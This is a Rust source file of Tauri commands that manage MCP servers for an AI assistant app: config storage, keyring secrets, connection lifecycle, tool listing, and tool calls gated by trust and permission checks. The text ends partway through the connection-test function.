//! MCP Tauri Commands
//!
//! MCP commands invoked by the frontend (config CRUD, connection lifecycle, tool/resource/prompt
//! fetching, tool invocation and approvals); MCP runtime state is held by [`McpServerState`].

use crate::core::events as ev;
use crate::core::models::*;
use crate::core::permission::{self, PermissionAction};
use crate::core::secure_store;
use crate::plugins::mcp::{
    self, McpRequestManager, McpServerManager, McpServerPlugin, McpServerState, PendingApprovals,
};
use serde::Serialize;
use serde_json::Value;
use std::collections::HashMap;
use std::sync::Arc;
use std::time::Duration;
use tauri::{AppHandle, Emitter, Manager, State};
use tokio::sync::oneshot;

use crate::core::tool_names;
use crate::ierr;

const TOOL_CALL_TIMEOUT: Duration = Duration::from_secs(30);

/// Approval-dialog wait budget: the user may be away from the screen, so the
/// safety valve is generous (10 min, aligned with the ask_user timeout). Firing
/// it emits `tool-approval-expired` so the bubble disappears instead of going stale.
const APPROVAL_WAIT_TIMEOUT: Duration = Duration::from_secs(600);

/// `start_mcp_server` 的全程序互斥（OnceLock 初始化）：串行化启动，
/// 与"旧连接先停止"配合杜绝同 id 重复/并发 start 泄漏子进程。
fn mcp_start_mutex() -> &'static tokio::sync::Mutex<()> {
    static M: std::sync::OnceLock<tokio::sync::Mutex<()>> = std::sync::OnceLock::new();
    M.get_or_init(|| tokio::sync::Mutex::new(()))
}

fn emit_status(
    app: &AppHandle,
    id: &str,
    status: McpStatus,
    message: Option<String>,
    tool_count: usize,
) {
    emit_status_full(app, id, status, message, tool_count, 0, 0);
}

fn emit_status_full(
    app: &AppHandle,
    id: &str,
    status: McpStatus,
    message: Option<String>,
    tool_count: usize,
    resource_count: usize,
    prompt_count: usize,
) {
    let _ = app.emit(
        ev::MCP_SERVER_STATUS,
        McpServerStatusInfo {
            id: id.to_string(),
            status,
            message,
            tool_count,
            resource_count,
            prompt_count,
        },
    );
}

/// List MCP server configs (global merged with project-level view).
///
/// # Parameters
/// - `project_id` — when provided, overlays the project's `.aio/mcp-servers.json` (a
///   project-level server with the same name overrides the global one); global-only by default
///
/// # Returns
/// The merged config list; env secrets come back as `${KEYRING:...}` placeholders, never plaintext.
#[tauri::command]
pub async fn list_mcp_servers(
    app: AppHandle,
    project_id: Option<String>,
) -> Result<Vec<McpServerConfig>, String> {
    mcp::list_configs_merged(&app, project_id.as_deref()).map_err(|e| e.to_string())
}

/// List project-level `.aio/mcp-servers.json` servers that are not trusted yet.
///
/// Project-repo configs never auto-start until the user confirms trust (P0-1);
/// the frontend uses this list to render the trust prompt on project open.
///
/// # Parameters
/// - `project_id` — project ID
///
/// # Returns
/// Untrusted project-level configs (full transport, so the prompt can show
/// command/args/env/url); empty when the project file is absent or all trusted.
#[tauri::command]
pub async fn list_untrusted_project_mcp_servers(
    app: AppHandle,
    project_id: String,
) -> Result<Vec<McpServerConfig>, String> {
    let project_path = resolve_project_path_mcp(&app, &project_id)?;
    Ok(mcp::untrusted_project_servers(&app, &project_path))
}

/// Mark one project-level MCP server as trusted (records the current config
/// fingerprint in the app-data trust store; a later repo change revokes trust).
///
/// # Parameters
/// - `project_id` — project ID; `server_id` — server ID within the project file
///
/// # Returns
/// The trusted server config (the caller may start it right away).
#[tauri::command]
pub async fn trust_project_mcp_server(
    app: AppHandle,
    project_id: String,
    server_id: String,
) -> Result<McpServerConfig, String> {
    let project_path = resolve_project_path_mcp(&app, &project_id)?;
    mcp::trust_project_server(&app, &project_path, &server_id).map_err(|e| e.to_string())
}

/// Add or update (upsert by id) an MCP server config.
///
/// # Parameters
/// - `config` — server config; env secrets go to the keyring first, only placeholders are persisted
/// - `project_id` — project context for the save (the settings page always passes the
///   current project); the write layer is pinned to where the id already lives:
///   a project-file entry updates the project file, a global-only entry stays global
///   (an edit must never silently clone a global server into the repo's `.aio/`).
///   Only a genuinely new id is created at project level.
///
/// Project-level saves record a trust marker at the same time (user intent IS the
/// authorization; repo-shipped files never pass through here — P0-1).
#[tauri::command]
pub async fn add_mcp_server(
    app: AppHandle,
    config: McpServerConfig,
    project_id: Option<String>,
) -> Result<(), String> {
    match project_id {
        Some(ref pid) => {
            let project_path = resolve_project_path_mcp(&app, pid)?;
            let project_file = mcp::load_project_mcp_servers(&project_path);
            let in_project = project_file.servers.contains_key(&config.id);
            let in_global = mcp::load_mcp_servers(&app).servers.contains_key(&config.id);
            if !in_project && in_global {
                // Layer pinning: editing a global-only server while a project is open
                // updates the global entry in place instead of re-homing it.
                let old = mcp::load_mcp_servers(&app).servers.get(&config.id).cloned();
                clean_orphaned_secrets_on_save(&app, old.as_ref(), &config);
                return mcp::upsert_config(&app, config).map_err(|e| e.to_string());
            }
            // MCP-23: the same-layer old entry is fully replaced by this save —
            // clean its keyring accounts that the new entry no longer references.
            let old = project_file.servers.get(&config.id).cloned();
            clean_orphaned_secrets_on_save(&app, old.as_ref(), &config);
            mcp::upsert_project_config(&project_path, config.clone()).map_err(|e| e.to_string())?;
            mcp::mark_project_server_trusted(&app, &project_path, &config);
            Ok(())
        }
        None => {
            let old = mcp::load_mcp_servers(&app).servers.get(&config.id).cloned();
            clean_orphaned_secrets_on_save(&app, old.as_ref(), &config);
            mcp::upsert_config(&app, config).map_err(|e| e.to_string())
        }
    }
}

/// MCP-23: (target, entries) view of a transport's keyring-backed fields.
fn transport_secret_bearers(
    t: &McpTransport,
) -> Vec<(&'static str, &std::collections::BTreeMap<String, String>)> {
    match t {
        McpTransport::Stdio { env, .. } => vec![("env", env)],
        McpTransport::Http { headers, .. } | McpTransport::StreamableHttp { headers, .. } => {
            vec![("header", headers)]
        }
    }
}

/// MCP-23: best-effort cleanup of keyring accounts orphaned by a config save.
///
/// The historic flow left secrets in the OS keyring FOREVER when a key was
/// removed/renamed, or its `${KEYRING:...}` placeholder was replaced with a plain
/// value: the removal-time cleanup only inspects the final config, which no longer
/// names those accounts. This runs at the point where the OLD entry is still known
/// — every account it referenced that the NEW entry does not is deleted.
fn clean_orphaned_secrets_on_save(
    app: &AppHandle,
    old: Option<&McpServerConfig>,
    new: &McpServerConfig,
) {
    let Some(old) = old else { return };
    let mut kept: std::collections::HashSet<String> = Default::default();
    for (_, entries) in transport_secret_bearers(&new.transport) {
        for v in entries.values() {
            kept.extend(mcp::keyring_accounts_in(v));
        }
    }
    for (_, entries) in transport_secret_bearers(&old.transport) {
        for v in entries.values() {
            for account in mcp::keyring_accounts_in(v) {
                if !kept.contains(&account) {
                    tracing::info!("[mcp] 清理已被配置移除的 keyring 密钥: {account}");
                    let _ = crate::core::secure_store::delete(app, &account);
                }
            }
        }
    }
}

/// Project path resolution dedicated to MCP.
fn resolve_project_path_mcp(app: &AppHandle, project_id: &str) -> Result<String, String> {
    mcp::resolve_project_path(app, project_id).map_err(|e| e.to_string())
}

/// Resolve a project path (returns Option, reports no error).
fn resolve_project_path_mcp_opt(app: &AppHandle, project_id: &str) -> Option<String> {
    mcp::resolve_project_path(app, project_id).ok()
}

/// Store one MCP environment variable or HTTP header secret in the system keyring.
#[tauri::command]
pub async fn save_mcp_server_secret(
    app: AppHandle,
    server_id: String,
    target: String,
    key: String,
    value: String,
) -> Result<String, String> {
    if server_id.trim().is_empty() || key.trim().is_empty() || value.is_empty() {
        return Err(ierr!(
            "服务器、密钥名称和值不能为空",
            "Server, secret key name, and value must not be empty"
        ));
    }
    if target != "env" && target != "header" {
        return Err(ierr!("不支持的密钥目标", "Unsupported secret target"));
    }
    let account = format!("mcp-server-{}-{}-{}", server_id, target, key);
    secure_store::set(&app, &account, &value).map_err(|error| error.to_string())?;
    Ok(format!("${{KEYRING:{}}}", account))
}

/// Remove an MCP server: first gracefully stop the running instance (abort in-flight
/// calls + plugin stop to clean up HTTP state), then remove it from the config and
/// delete its env secrets from the keyring.
///
/// # Parameters
/// - `id` — server ID; `project_id` — current project context
///
/// Deletion targets BOTH layers: the management list is the merged view, so removing
/// only the layer `project_id` names left a global entry alive that resurfaced on the
/// next reload ("delete didn't really delete"). Absent-layer removals are no-ops.
/// Also cleaned: the project trust-store entry, keyring secrets named by EITHER
/// layer's entry, and the project's approval-derived (`auto`) allow rules bound to
/// this server — deleting a server leaves no live grants behind.
#[tauri::command]
pub async fn remove_mcp_server(
    app: AppHandle,
    mgr: State<'_, McpServerManager>,
    state: State<'_, McpServerState>,
    requests: State<'_, McpRequestManager>,
    id: String,
    project_id: Option<String>,
) -> Result<(), String> {
    // Reuse the stop_mcp_server cleanup logic: abort in-flight calls + plugin.stop (clears HTTP_STATES)
    requests.abort_server(&id);
    // MCP-12: stop every config variant of this id (project overlays may have forked
    // the pool into several fingerprint-keyed entries)
    let conns = state.remove_all_variants(&id);
    for conn in conns {
        let transport_id = conn.transport_kind.clone();
        if let Some(plugin) = mgr.get(&transport_id) {
            let conn_owned = Arc::try_unwrap(conn).unwrap_or_else(|arc| (*arc).clone());
            let _ = plugin.stop(conn_owned).await;
        }
    }
    // Resolve the project path once — reused by config removal, trust cleanup,
    // and the permission-rule purge below.
    let project_path = match project_id {
        Some(ref pid) => Some(resolve_project_path_mcp(&app, pid)?),
        None => None,
    };
    // Delete this server's keyring secrets referenced by EITHER layer's entry —
    // a project override may name different env/header keys than the global entry,
    // and the merged (project-first) view would miss the global-only accounts.
    let mut layer_configs: Vec<McpServerConfig> = Vec::new();
    if let Some(ref pp) = project_path {
        if let Some(c) = mcp::load_project_mcp_servers(pp).servers.get(&id) {
            layer_configs.push(c.clone());
        }
    }
    if let Some(c) = mcp::load_mcp_servers(&app).servers.get(&id) {
        layer_configs.push(c.clone());
    }
    for cfg in &layer_configs {
        for (target, values) in transport_secret_bearers(&cfg.transport) {
            for (key, value) in values {
                let legacy = secure_store::accounts::mcp_server_env(&id, key);
                let _ = secure_store::delete(&app, &legacy);
                // MCP-23: delete the standard account for EVERY key (the account may
                // hold a stale secret from an earlier placeholder round even when the
                // current value is plain — keyring delete of a missing entry is a no-op),
                // plus every account name the value still names.
                let account = format!("mcp-server-{}-{}-{}", id, target, key);
                let _ = secure_store::delete(&app, &account);
                for named in mcp::keyring_accounts_in(value) {
                    let _ = secure_store::delete(&app, &named);
                }
            }
        }
    }
    if let Some(ref pp) = project_path {
        mcp::remove_project_config(pp, &id).map_err(|e| e.to_string())?;
        // The project trust marker (fingerprint) belongs to the deleted entry.
        if let Err(e) = mcp::trust_store(&app).remove_trust(pp, &id) {
            tracing::warn!("[mcp-trust] 删除 server 信任标记失败: {e}");
        }
        // Approval-derived allow rules ("始终允许") bound to this server die with it;
        // hand-written rules are never touched.
        if let Err(e) = permission::remove_auto_rules_for_server(pp, &id) {
            tracing::warn!("[permission] 清理派生放行规则失败: {e}");
        }
    }
    // Global layer too — no-op when the id never lived there.
    mcp::remove_config(&app, &id).map_err(|e| e.to_string())?;
    emit_status(&app, &id, McpStatus::Disconnected, None, 0);
    Ok(())
}

/// Start and connect to an MCP server: initialize handshake, then fetch its tool list.
///
/// # Parameters
/// - `id` — server ID (looked up in the merged config); `project_id` — overlays project-level config
///
/// # Returns
/// The server's tool specs (OpenAI function-call format); progress is broadcast to the
/// frontend as Connecting/Connected/Error via the `mcp-server-status` event.
#[tauri::command]
pub async fn start_mcp_server(
    app: AppHandle,
    mgr: State<'_, McpServerManager>,
    state: State<'_, McpServerState>,
    id: String,
    project_id: Option<String>,
) -> Result<Vec<ToolSpec>, String> {
    let config = mcp::get_config_merged(&app, &id, project_id.as_deref())
        .ok_or_else(|| ierr!("未找到 MCP server: {}", "MCP server not found: {}", id))?;

    // P0-1 信任门（纵深防御）：生效配置来自项目 `.aio/mcp-servers.json` 且未经
    // 用户确认信任时拒绝 spawn。恶意仓库放置 autoStart 配置即可零确认执行任意
    // 命令，因此信任标记必须先经前端确认写入（仓库之外），这里只认信任存储。
    if !mcp::project_server_spawn_allowed(&app, project_id.as_deref(), &id)
        .map_err(|e| e.to_string())?
    {
        let message = ierr!(
            "服务器「{}」的配置来自项目 .aio/mcp-servers.json，未经信任确认已拒绝启动（请在项目打开时的 MCP 确认提示中信任）",
            "Server \"{}\" uses config from the project's .aio/mcp-servers.json and is not trusted yet; start refused (confirm trust in the project MCP prompt)",
            config.display_name
        );
        emit_status(&app, &id, McpStatus::Error, Some(message.clone()), 0);
        return Err(message);
    }

    emit_status(&app, &id, McpStatus::Connecting, None, 0);

    // 全程序启动互斥：串行化 start，杜绝同 id 并发 start 造成旧子进程泄漏
    // （stdout reader 持有连接克隆，kill_on_drop 永不触发，覆盖 map 前必须显式 stop 旧连接）
    let _start_guard = mcp_start_mutex().lock().await;

    // 重复 start 防护：同 id 且同生效配置的旧连接先停止（重启语义；失败时保持停止态而非泄漏进程）。
    // MCP-12: 只替换同指纹变体——其他项目以不同 overlay 运行的连接不受影响。
    if let Some(old) = state.remove_for_config(&id, &config) {
        if let Some(p) = mgr.get(&old.transport_kind) {
            let _ = p.stop((*old).clone()).await;
        } else {
            let _ = old.close().await;
        }
    }

    let transport_id = match &config.transport {
        McpTransport::Stdio { .. } => "stdio",
        McpTransport::Http { .. } => "http",
        McpTransport::StreamableHttp { .. } => "streamable_http",
    };

    let plugin = mgr.get(transport_id).ok_or_else(|| {
        ierr!(
            "未注册 transport 插件: {}",
            "No transport plugin registered for: {}",
            transport_id
        )
    })?;

    let conn = plugin.start(app.clone(), &config).await.map_err(|e| {
        ierr!(
            "启动 MCP server 失败: {}",
            "Failed to start MCP server: {}",
            e
        )
    })?;
    let conn = Arc::new(conn);

    // Protocol handshake（启动/握手失败必须显式终止子进程——`?` 提前返回会连同
    // stdout reader 持有的 Arc 一起泄漏，kill_on_drop 永不触发）
    let server_info = match plugin.initialize(&conn).await {
        Ok(info) => info,
        Err(e) => {
            let _ = plugin.stop((*conn).clone()).await;
            return Err(ierr!(
                "MCP initialize 失败: {}",
                "MCP initialize failed: {}",
                e
            ));
        }
    };

    // Fetch the tool list（同上：失败路径终止子进程）
    let tools = match plugin.list_tools(&conn).await {
        Ok(tools) => tools,
        Err(e) => {
            let _ = plugin.stop((*conn).clone()).await;
            return Err(ierr!(
                "MCP tools/list 失败: {}",
                "MCP tools/list failed: {}",
                e
            ));
        }
    };

    // Apply the enabled_tools allowlist
    let filtered: Vec<ToolSpec> = if config.enabled_tools.is_empty() {
        tools.clone()
    } else {
        tools
            .iter()
            .filter(|t| config.enabled_tools.contains(&t.function.name))
            .cloned()
            .collect()
    };

    // Only fetch the resource list when the server declares the resources capability
    let (_resources, resource_count) = if server_info
        .capabilities
        .as_ref()
        .and_then(|c| c.resources.as_ref())
        .is_some()
    {
        match plugin.list_resources(&conn).await {
            Ok(r) => {
                let count = r.len();
                (Some(r), count)
            }
            Err(e) => {
                tracing::debug!("MCP {} resources/list 失败: {}", id, e);
                (None, 0)
            }
        }
    } else {
        (None, 0)
    };

    // Only fetch the prompt list when the server declares the prompts capability
    let (_prompts, prompt_count) = if server_info
        .capabilities
        .as_ref()
        .and_then(|c| c.prompts.as_ref())
        .is_some()
    {
        match plugin.list_prompts(&conn).await {
            Ok(p) => {
                let count = p.len();
                (Some(p), count)
            }
            Err(e) => {
                tracing::debug!("MCP {} prompts/list 失败: {}", id, e);
                (None, 0)
            }
        }
    } else {
        (None, 0)
    };

    // MCP-12: the pool key carries the effective-config fingerprint, so a project
    // overlay variant never collides with (or restarts) another project's connection.
    state.insert_for_config(&id, &config, conn);

    emit_status_full(
        &app,
        &id,
        McpStatus::Connected,
        None,
        filtered.len(),
        resource_count,
        prompt_count,
    );
    Ok(filtered)
}

/// Stop a running MCP server: abort its in-flight tool calls, invoke the transport
/// plugin's stop (stdio terminates the child process / HTTP clears its state table),
/// and remove the entry from the runtime state table.
///
/// # Parameters
/// - `id` — server ID; succeeds silently when not running (idempotent)
#[tauri::command]
pub async fn stop_mcp_server(
    app: AppHandle,
    mgr: State<'_, McpServerManager>,
    state: State<'_, McpServerState>,
    requests: State<'_, McpRequestManager>,
    id: String,
) -> Result<(), String> {
    // First abort this server's in-flight calls
    requests.abort_server(&id);

    // MCP-12: stop every config variant of this id (user-intent "stop this server")
    let conns = state.remove_all_variants(&id);
    for conn in conns {
        let transport_id = conn.transport_kind.clone();
        if let Some(plugin) = mgr.get(&transport_id) {
            // stop needs an owned conn; unwrap the Arc here
            let conn_owned = Arc::try_unwrap(conn).unwrap_or_else(|arc| {
                // Other references remain: forcibly taking a new connection is complex, so clone;
                // plugin::stop in practice only calls close(), so sharing is acceptable
                (*arc).clone()
            });
            let _ = plugin.stop(conn_owned).await;
        }
    }
    emit_status(&app, &id, McpStatus::Disconnected, None, 0);
    Ok(())
}

/// Return a status summary for every server in the runtime state table.
///
/// # Returns
/// id → status info (connected entries only; tool/resource counts are placeholder 0
/// here, accurate counts are pushed via the `mcp-server-status` event).
#[tauri::command]
pub async fn list_mcp_server_status(
    state: State<'_, McpServerState>,
) -> Result<HashMap<String, McpServerStatusInfo>, String> {
    // MCP-12: pool keys carry fingerprint suffixes; the UI consumes plain server ids.
    let ids = state.distinct_ids();
    let mut out = HashMap::new();
    for id in ids {
        out.insert(
            id.clone(),
            McpServerStatusInfo {
                id,
                status: McpStatus::Connected,
                message: None,
                tool_count: 0,
                resource_count: 0,
                prompt_count: 0,
            },
        );
    }
    Ok(out)
}

/// List tools from every connected MCP server (sends tools/list to each server).
///
/// # Parameters
/// - `project_id` — only used for the config view; the connected set comes from the runtime state table
///
/// # Returns
/// The merged tool spec list (tool names carry the server namespace); one server failing
/// to fetch does not block the others, its tools are skipped.
#[tauri::command]
pub async fn list_mcp_tools(
    app: AppHandle,
    mgr: State<'_, McpServerManager>,
    state: State<'_, McpServerState>,
    project_id: Option<String>,
) -> Result<Vec<ToolSpec>, String> {
    // 1) Collect all server_ids, then release the lock immediately
    // (MCP-12: distinct ids — the pool may hold several fingerprint variants per id)
    let ids = state.distinct_ids();

    // 2) Collect (id, conn, cfg, plugin) tuples; await only once everything is ready
    let mut jobs: Vec<(
        McpServerConfig,
        Arc<dyn McpServerPlugin>,
        Arc<crate::plugins::mcp::connection::McpConnection>,
    )> = Vec::new();
    for id in ids {
        let cfg = match mcp::get_config_merged(&app, &id, project_id.as_deref()) {
            Some(c) => c,
            None => continue,
        };
        let transport_id = match &cfg.transport {
            McpTransport::Stdio { .. } => "stdio",
            McpTransport::Http { .. } => "http",
            McpTransport::StreamableHttp { .. } => "streamable_http",
        };
        let Some(plugin) = mgr.get(transport_id) else {
            continue;
        };
        // MCP-12: fingerprint-aware lookup — never another project's variant
        let conn = state.get_for_config(&id, &cfg);
        if let Some(conn) = conn {
            jobs.push((cfg, plugin, conn));
        }
    }
    // 3) Call sequentially (avoids holding the lock across an await inside the loop)
    let mut all_tools = Vec::new();
    for (cfg, plugin, conn) in jobs {
        if let Ok(tools) = plugin.list_tools(&conn).await {
            let filtered: Vec<ToolSpec> = if cfg.enabled_tools.is_empty() {
                tools
            } else {
                tools
                    .into_iter()
                    .filter(|t| cfg.enabled_tools.contains(&t.function.name))
                    .collect()
            };
            all_tools.extend(filtered);
        }
    }
    Ok(all_tools)
}

/// Aggregate tools by the assistant's enabled MCP server list.
///
/// - `mcp_server_ids`: server ids the frontend selected for this assistant (opt-in; empty = no tools).
/// - Only iterates the currently connected servers among those ids, applying each server's
///   `enabled_tools` allowlist.
/// - Returns flat `tools` (fed directly to the LLM) + `tool_server_map` (toolName → serverId,
///   used by call_mcp_tool to resolve), replacing unreliable frontend heuristic lookup.
#[tauri::command]
pub async fn list_mcp_tools_for_assistant(
    app: AppHandle,
    mgr: State<'_, McpServerManager>,
    state: State<'_, McpServerState>,
    mcp_server_ids: Vec<String>,
    project_id: Option<String>,
) -> Result<AssistantTools, String> {
    list_mcp_tools_for_assistant_inner(&app, mgr.inner(), state.inner(), mcp_server_ids, project_id)
        .await
}

/// Internal implementation: reused by the `run_agent_turn` backend so it skips the Tauri State unwrap.
pub(crate) async fn list_mcp_tools_for_assistant_inner(
    app: &AppHandle,
    mgr: &McpServerManager,
    state: &McpServerState,
    mcp_server_ids: Vec<String>,
    project_id: Option<String>,
) -> Result<AssistantTools, String> {
    // 1) Collect connected (cfg, plugin, conn) for the input ids; take the conn out, then release the lock immediately
    let mut jobs: Vec<(
        McpServerConfig,
        Arc<dyn McpServerPlugin>,
        Arc<crate::plugins::mcp::connection::McpConnection>,
    )> = Vec::new();
    for id in mcp_server_ids {
        let cfg = match mcp::get_config_merged(app, &id, project_id.as_deref()) {
            Some(c) => c,
            None => continue,
        };
        let transport_id = match &cfg.transport {
            McpTransport::Stdio { .. } => "stdio",
            McpTransport::Http { .. } => "http",
            McpTransport::StreamableHttp { .. } => "streamable_http",
        };
        let Some(plugin) = mgr.get(transport_id) else {
            continue;
        };
        // MCP-12: fingerprint-aware lookup — a project overlay variant must get its
        // own connection, never another project's.
        let conn = state.get_for_config(&id, &cfg);
        if let Some(conn) = conn {
            jobs.push((cfg, plugin, conn));
        }
    }

    // 2) Fetch tools sequentially, apply the allowlists, and build tools + tool_server_map
    let mut tools = Vec::new();
    let mut tool_server_map: HashMap<String, String> = HashMap::new();
    for (cfg, plugin, conn) in jobs {
        if let Ok(server_tools) = plugin.list_tools(&conn).await {
            let filtered: Vec<ToolSpec> = if cfg.enabled_tools.is_empty() {
                server_tools
            } else {
                server_tools
                    .into_iter()
                    .filter(|t| cfg.enabled_tools.contains(&t.function.name))
                    .collect()
            };
            for t in &filtered {
                tool_server_map.insert(t.function.name.clone(), cfg.id.clone());
            }
            tools.extend(filtered);
        }
    }
    Ok(AssistantTools {
        tools,
        tool_server_map,
    })
}

/// Manually invoke one MCP tool (settings-page test runs; the agent loop uses the
/// internal `execute_tool_call` path instead).
///
/// MCP-13/HOR-3: this IPC entry previously accepted an `agent_mode` parameter from
/// the caller — forgeable, with a missing/unknown value mapping to `Off`, which
/// skipped the entire permission check (structural fail-open). The parameter is
/// gone: manual invocations always run under Normal semantics (interactive
/// approval rules apply); the agent loop derives its mode server-side.
#[tauri::command]
pub async fn call_mcp_tool(
    app: AppHandle,
    server_id: String,
    tool_name: String,
    arguments: Value,
    project_id: Option<String>,
) -> Result<ToolResult, String> {
    let mode = AgentMode::Normal;
    // The call_mcp_tool path has no CancellationToken; use a fresh one (never cancelled)
    let token = tokio_util::sync::CancellationToken::new();
    execute_tool_call(
        &app,
        &server_id,
        &tool_name,
        arguments,
        project_id.as_deref(),
        &mode,
        &token,
    )
    .await
}

/// Execute a single MCP tool call: allowlist → permission/approval → spawn the call → collect the result.
///
/// Reused by `run_agent_turn` (carries a CancellationToken so user stop can interrupt a
/// pending approval) and `call_mcp_tool` (no cancellation, uses a dedicated token). MCP
/// global state is resolved through `AppHandle` to avoid borrows escaping into `tokio::spawn`.
///
/// - `call_id` carries a uuid so concurrent same-name tool calls cannot overwrite each
///   other's handles.
/// - Approval waiting wraps `request_tool_approval` and `token.cancelled()` in `select!`,
///   so user stop immediately interrupts a pending approval.
pub(crate) async fn execute_tool_call(
    app: &AppHandle,
    server_id: &str,
    tool_name: &str,
    arguments: Value,
    project_id: Option<&str>,
    agent_mode: &AgentMode,
    token: &tokio_util::sync::CancellationToken,
) -> Result<ToolResult, String> {
    let mgr = app.state::<McpServerManager>();
    let state = app.state::<McpServerState>();
    let requests = app.state::<McpRequestManager>();
    let pending = app.state::<PendingApprovals>();

    let cfg = mcp::get_config_merged(app, server_id, project_id).ok_or_else(|| {
        ierr!(
            "未找到 MCP server: {}",
            "MCP server not found: {}",
            server_id
        )
    })?;
    if !cfg.enabled_tools.is_empty() && !cfg.enabled_tools.contains(&tool_name.to_string()) {
        return Err(ierr!(
            "工具 {} 不在 server {} 的白名单中",
            "Tool {} is not in the allowlist of server {}",
            tool_name,
            server_id
        ));
    }

    // Permission check (backend defense layer).
    // SEC-19: Off (chat mode) previously SKIPPED the check entirely (structural
    // fail-open — a forged/missing mode meant zero checks); it now fails closed.
    if matches!(agent_mode, AgentMode::Off) {
        return Err(ierr!(
            "工具 '{}' 在 Off（聊天）模式下不可用",
            "Tool '{}' is unavailable in Off (chat) mode",
            tool_name
        ));
    }
    {
        let project_path = project_id.and_then(|pid| resolve_project_path_mcp_opt(app, pid));
        let custom_rules = project_path
            .as_ref()
            .map(|p| permission::load_permissions(Some(p)).rules)
            .unwrap_or_default();
        let action = permission::check_permission(
            tool_name,
            server_id,
            &arguments,
            agent_mode,
            &custom_rules,
        );

        // Force approval for untrusted-server tools under Auto (完全权限): autonomous mode must
        // not blanket-allow unknown external tools (auto-allow only once the server is trusted in settings).
        // 信任判定（两轮用户实测修正）：项目级 server 的信任标记不在配置 JSON 里，而在
        // 项目信任存储（mcp-trust.json，项目打开时经指纹确认写入）——确认过的项目 server
        // 不逐次弹窗。全局 server 以 MCP 设置页的 trusted 开关为准：它不存在于项目文件，
        // 工具门必须拿到「项目级信任」的正向证据——不能把 spawn 门的「非项目级即放行」
        // 当成已信任（那会让全局未信任 server 永远免弹，round21 实测回归）。
        let project_trusted = mcp::project_server_tool_trusted(app, project_id, server_id);
        // An explicit user allow — a persisted `.aio/permissions.json` rule (e.g. from a
        // previous "always allow") or a session rule — counts as configuration: the gate
        // must not re-prompt every call for a call the user already greenlit.
        let user_allowed = permission::user_allow_rule_matches(
            tool_name,
            server_id,
            &arguments,
            agent_mode,
            &custom_rules,
        );
        let untrusted_auto = agent_mode.is_full_autonomy()
            && action == PermissionAction::Allow
            && !cfg.trusted
            && !project_trusted
            && !user_allowed;
        let action = if untrusted_auto {
            PermissionAction::Ask
        } else {
            action
        };

        match action {
            PermissionAction::Deny => {
                return Err(ierr!(
                    "工具 '{}' 已在当前模式下被安全策略禁止执行（Deny）。\n如需执行，请切换到完全权限模式或在项目权限设置中添加 allow 规则。",
                    "Tool '{}' is blocked by the security policy in the current mode (Deny).\nTo run it, switch to full-permission mode or add an allow rule in project permission settings.",
                    tool_name
                ));
            }
            PermissionAction::Ask => {
                // Needs user confirmation; select! lets cancellation interrupt a pending approval
                let reason = if untrusted_auto {
                    ierr!(
                        "工具 '{}' 来自未受信任的 MCP server「{}」，请在确认安全后执行（项目级 server 在项目打开的信任确认中标记；全局 server 可在 MCP 设置中标记为受信任以跳过确认）",
                        "Tool '{}' comes from an untrusted MCP server \"{}\"; confirm it is safe before running (project servers are trusted via the project-open confirmation; global servers can be marked trusted in MCP settings to skip this)",
                        tool_name, cfg.display_name
                    )
                } else {
                    ierr!(
                        "工具 '{}' 需要您的确认才能执行",
                        "Tool '{}' requires your confirmation to run",
                        tool_name
                    )
                };
                let approval_fut = request_tool_approval(
                    app,
                    pending.inner(),
                    server_id,
                    tool_name,
                    &arguments,
                    &reason,
                    None,
                    None,
                    project_path.as_deref(),
                );
                tokio::select! {
                    _ = token.cancelled() => return Err("cancelled".into()),
                    res = approval_fut => res?,
                }
            }
            PermissionAction::Allow => {}
        }
    }

    let transport_id = match &cfg.transport {
        McpTransport::Stdio { .. } => "stdio",
        McpTransport::Http { .. } => "http",
        McpTransport::StreamableHttp { .. } => "streamable_http",
    };
    let plugin = mgr.get(transport_id).ok_or_else(|| {
        ierr!(
            "未注册 transport: {}",
            "No registered transport: {}",
            transport_id
        )
    })?;
    let conn = {
        // MCP-12: fingerprint-aware lookup — the merged config decides which variant
        // this call belongs to; a different project's connection is never reused.
        state
            .get_for_config(server_id, &cfg)
            .ok_or_else(|| {
                ierr!(
                    "MCP server 未连接（当前项目的生效配置下无活动连接）: {}",
                    "MCP server not connected (no active connection for this project's effective config): {}",
                    server_id
                )
            })?
    };

    // Track by call_id; the uuid keeps it unique so concurrent same-name calls cannot
    // overwrite each other's handles. The AbortHandle stays registered for the whole
    // await so stop / window-destroy can abort the task for real (MCP-2: the historic
    // insert-then-immediate-remove made abort_all iterate an empty table and the
    // cancellation branch merely detached the task).
    let call_id = format!("mcp:{}:{}:{}", server_id, tool_name, uuid::Uuid::new_v4());
    let plugin_arc = plugin.clone();
    let conn_arc = conn.clone();
    let tool_for_task = tool_name.to_string();
    let handle = tokio::spawn(async move {
        plugin_arc
            .call_tool(&conn_arc, &tool_for_task, arguments, TOOL_CALL_TIMEOUT)
            .await
    });
    requests.0.insert(call_id.clone(), handle.abort_handle());

    // Wait for the result or cancellation (the cancellation branch aborts the task instead of detaching it)
    let result = tokio::select! {
        _ = token.cancelled() => {
            if let Some((_, abort)) = requests.0.remove(&call_id) {
                abort.abort();
            }
            Err("cancelled".into())
        }
        res = handle => match res {
            Ok(r) => r.map_err(|e: crate::plugins::mcp::error::McpError| e.to_string()),
            Err(e) => Err(ierr!("工具调用任务 join 失败: {}", "Failed to join tool call task: {}", e)),
        },
    };
    requests.0.remove(&call_id);
    result
}

/// Run a one-off trial connection with the given (not yet saved) config: start, handshake,
/// fetch the tool list, then disconnect immediately; backs the settings page's "test connection".
///
/// # Parameters
/// - `config` — the config under test; not written to the config file, not registered in the runtime state table
///
/// # Returns
/// The tool spec list on success; an error string on failure.
#[tauri::command]
pub async fn test_mcp_server_connection(
    app: AppHandle,
    mgr: State<'_, McpServerManager>,
    config: McpServerConfig,
) -> Result<Vec<ToolSpec>, String> {
    let transport_id = match &config.transport {
        McpTransport::Stdio { .. } => "stdio",
        McpTransport::Http { .. } => "http",
        McpTransport::StreamableHttp { .. } => "streamable_http",
    };
    let plugin = mgr.get(transport_id).ok_or_else(|| {
        ierr!(
            "未注册 transport: {}",
            "No registered transport: {}",
            transport_id
        )
    })?;
    let conn = plugin
        .start(app.clone(), &config)
        .await
        .map_err(|e| e.to_string())?;
    // 握手/列举失败路径同样必须 stop（`?` 提前返回会泄漏 stdio 子进程）
    if let Err(e) = plugin.initialize(&conn).await {
        let _ = plugin.stop(conn).await;
        return Err(e.to_string());
    }
    let tools = match plugin.list_tools(&conn).await {
        Ok(tools) => tools,
        Err(e) => {
            let _ = plugin.stop(conn).await;
            return Err(e.to_string());
        }
    };
    // Close as soon as the test finishes
    let _ = plugin.stop(conn).await;
